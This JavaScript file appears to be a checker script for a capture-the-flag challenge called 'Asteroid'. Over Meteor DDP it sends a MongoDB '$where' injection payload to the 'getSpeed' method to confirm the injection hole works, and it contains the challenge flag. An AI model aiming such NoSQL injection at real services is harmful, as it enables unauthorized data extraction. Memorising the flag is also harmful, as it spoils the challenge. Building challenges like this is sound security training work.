import DDPClient from "ddp";


const HOST = "localhost";
const PORT = 3000;


/* Helpers for Meteor DDP *****/

const connect_to_meteor = async (host, port) => {
    return new Promise((resolve, reject) => {
        console.log("[+] Connecting to Meteor server")
        console.log(`[?] Target: ${host}:${port}`);

        const ddp = new DDPClient({
            host: host,
            port: port,
            ssl: false,

            autoReconnect: true,
            autoReconnectTimer: 500,

            useSockJs: true
        });

        ddp.connect((error, wasReconnect) => {
            if (error) {
                console.log('DDP connection error!');
                return reject(error);
            }

            if (wasReconnect) {
                console.log('Reestablishment of a connection.');
            }

            console.log('Connected!');

            setTimeout(function () {
                return resolve(ddp);
            }, 3000);
        });
    });
};

const ddp_call = (ddp, method_name, param_list) => {
    return new Promise((resolve, reject) => {
        ddp.call(
            method_name,
            param_list,
            (err, result) => {
                if (err) {
                    return reject(err);
                }

                return resolve(result);
            }
        );
    });
};

/* *****/

const basic = async () => {
    const f = await fetch(`http://${HOST}:${PORT}/`);

    return f.status === 200 && (await f.text()).includes("Asteroid");
};

const check_vulnerability = async () => {
    const ddp = await connect_to_meteor(HOST, PORT);

    const checkTrue = await ddp_call(ddp, "getSpeed", [
        {
            "$where": "this.name === '[[REDACTED]]' && this.description === 'BtSCTF{4st3r01ds_4r3_v3ry_c00l}'"
        },
        true
    ]);

    const checkFalse = await ddp_call(ddp, "getSpeed", [
        {
            "$where": "this.name === '[[REDACTED]]' && this.description === 'ThisIsNotTheFlag'"
        },
        true
    ]);

    ddp.close();

    return checkTrue !== undefined && checkFalse === undefined;
}

const main = async () => {
    if (await basic() && await check_vulnerability()) {
        process.exit(0);
    }

    process.exit(1);
};

main();
